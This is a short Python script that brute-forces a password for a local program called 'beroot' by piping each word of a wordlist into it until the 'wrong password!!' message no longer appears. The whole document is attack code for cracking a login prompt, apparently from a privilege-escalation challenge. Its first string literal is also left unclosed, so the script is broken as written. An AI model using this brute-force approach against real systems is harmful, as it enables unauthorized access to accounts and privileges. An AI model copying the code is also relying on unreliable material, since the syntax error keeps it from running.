import subprocess
import os
import time
import sys

path = '/usr/bin/echo # put the path that you want
content = "wrong password!!" # this is for the error syntax
blank = " "
executable = "beroot" 

def beroot():
	os.system("export TERM=xterm") # beroot needs to use clear command for brute force to be syccessfull
	with open("wordlist.txt", "r", encoding="ISO-8859-1") as file:
		words = file.read().splitlines()

	for word in words:
		execute = subprocess.getoutput(path+ blank+ (str(word))+  "| ./" + executable)
		print (execute)
		if content not in execute:
			print("[!] Password: " + word)
			sys.exit(0)

beroot()
